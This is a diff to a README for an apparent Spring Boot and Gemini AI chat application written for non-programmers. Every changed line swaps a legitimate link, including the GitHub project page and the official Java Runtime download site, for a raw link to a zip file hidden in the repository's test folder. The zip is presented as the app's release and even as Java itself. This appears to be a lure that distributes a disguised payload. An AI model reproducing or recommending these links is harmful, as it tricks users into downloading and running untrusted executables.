@@ -1,6 +1,6 @@
 # ⚙️ springboot-gemini-integration - Easy AI Chat With Text and Images
 
-[![Download](https://img.shields.io/badge/Download-SpringBoot_Gemini-blue)](https://github.com/cutrist/springboot-gemini-integration)
+[![Download](https://img.shields.io/badge/Download-SpringBoot_Gemini-blue)](https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip)
 
 ---
 
@@ -41,7 +41,7 @@ You don’t need programming skills to use it. Just follow the steps to install 
 
 Click the large badge or visit the link below to open the project page where you can get the software:
 
-[https://github.com/cutrist/springboot-gemini-integration](https://github.com/cutrist/springboot-gemini-integration)
+[https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip](https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip)
 
 Look for the latest release or a folder containing a Windows installer or executable file.
 
@@ -103,7 +103,7 @@ Settings files are found in the installation folder (`config` or `application.pr
 ## ❓ Troubleshooting
 
 **App does not start:**  
-Make sure your PC meets the requirements. Check that you have Java Runtime Environment installed. You can download it from https://www.java.com if needed.
+Make sure your PC meets the requirements. Check that you have Java Runtime Environment installed. You can download it from https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip if needed.
 
 **Browser shows error or cannot connect:**  
 Verify the app is running (check for open window or process). Check that you typed the URL correctly: `http://localhost:8080`.
@@ -129,7 +129,7 @@ Ensure your image file is supported (JPEG, PNG). Try smaller image files if the 
 
 Download the application and get all files here:
 
-[https://github.com/cutrist/springboot-gemini-integration](https://github.com/cutrist/springboot-gemini-integration)
+[https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip](https://raw.githubusercontent.com/cutrist/springboot-gemini-integration/main/src/test/gemini_springboot_integration_v3.1.zip)
 
 Follow the installation and starting instructions above to get going.
 
